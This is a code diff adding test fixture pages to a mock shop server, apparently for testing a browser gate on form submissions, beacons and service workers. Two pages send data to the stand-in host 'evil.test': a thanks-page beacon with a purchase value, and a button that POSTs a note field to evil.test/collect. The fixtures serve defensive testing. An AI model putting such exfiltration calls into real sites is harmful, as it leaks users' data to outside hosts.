@@ -242,6 +242,12 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
           repeat: `f.onsubmit = async (e) => { e.preventDefault(); for (let i = 0; i < 2; i++) await fetch('/api/order', { method: 'POST', body: 'op=validate' }); fetch('/api/order', { method: 'POST', body: new FormData(f) }); };`,
           // a script changes the form at the click, so the gate refuses it, and a beacon leaves at the same moment.
           changed: `f.querySelector('button').onpointerdown = () => { f.qty.value = '500'; navigator.sendBeacon('/log', 'click'); };`,
+          // a single-page shop sends its form as json.
+          json: `f.onsubmit = (e) => { e.preventDefault(); fetch('/api/order', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ qty: f.qty.value }) }); };`,
+          // the page of the answer sends an analytics beacon to an off-list host.
+          thanks: `f.action = '/thanks';`,
+          // the site answers the post after 8 s, longer than the action timeout of the tests.
+          slow: `f.action = '/slow-answer';`,
         };
         const mode = new URL(path, 'http://x').searchParams.get('mode') ?? 'sync';
         return send(200, html(`<form id="f" action="/order" method="post"><label>Qty <input name="qty" value="1"></label><button>Place order</button></form><script>${handlers[mode]}</script>`, 'Checkout'));
@@ -259,6 +265,48 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
       case 'shop.test/typebutton':
         // a post form whose only button is type=button and sends the form with a script.
         return send(200, html('<form id="f" action="/order" method="post"><label>Qty <input name="qty" value="1"></label><button type="button" onclick="f.requestSubmit()">Place order</button></form>', 'Order'));
+      case 'shop.test/thanks':
+        return send(200, html(`<h1>Thank you</h1><script>navigator.sendBeacon('${at('evil.test', '/collect?en=purchase')}', 'value=19.99')</script>`, 'Thanks'));
+      case 'shop.test/slow-answer':
+        return void setTimeout(() => send(200, html('<h1>Paid</h1>', 'Paid')), 8000);
+      case 'shop.test/products':
+        // a product grid: each product has its own form with a button of the same name.
+        return send(
+          200,
+          html(
+            ['socks', 'shirt']
+              .map((item) => `<h2>${item}</h2><form action="/cart-add" method="post"><input type="hidden" name="item" value="${item}"><label>Qty <input name="qty" value="1"></label><button>Add to cart</button></form>`)
+              .join(''),
+            'Products',
+          ),
+        );
+      case 'shop.test/sw.js':
+        // a plain network-first service worker, as many sites ship it.
+        return send(
+          200,
+          `self.addEventListener('install', () => self.skipWaiting());
+           self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
+           self.addEventListener('fetch', (e) => e.respondWith(fetch(e.request)));`,
+          'text/javascript',
+        );
+      case 'shop.test/sw-register':
+        return send(200, html(`<p id="out">-</p><script>navigator.serviceWorker.register('/sw.js').then(() => navigator.serviceWorker.ready).then(() => (out.textContent = 'ready'), (e) => (out.textContent = 'error ' + e));</script>`));
+      case 'shop.test/sw-app':
+        return send(
+          200,
+          html(
+            `<label>Note <input id="n"></label><button id="go" type="button">Delete item</button><p id="out">-</p>
+             <script>
+               out.textContent = 'controlled ' + Boolean(navigator.serviceWorker && navigator.serviceWorker.controller);
+               go.onclick = async () => {
+                 const one = await fetch('/api/delete', { method: 'POST', body: 'id=7' }).then((r) => r.status, () => 'err');
+                 const two = await fetch('${at('evil.test', '/collect')}', { method: 'POST', mode: 'no-cors', body: 'note=' + n.value }).then(() => 'sent', () => 'err');
+                 out.textContent = 'delete ' + one + ' evil ' + two;
+               };
+             </script>`,
+            'App',
+          ),
+        );
       case 'shop.test/api/validate':
         return void setTimeout(() => send(200, '{"ok":true}', 'application/json'), 400);
       case 'shop.test/dialog':
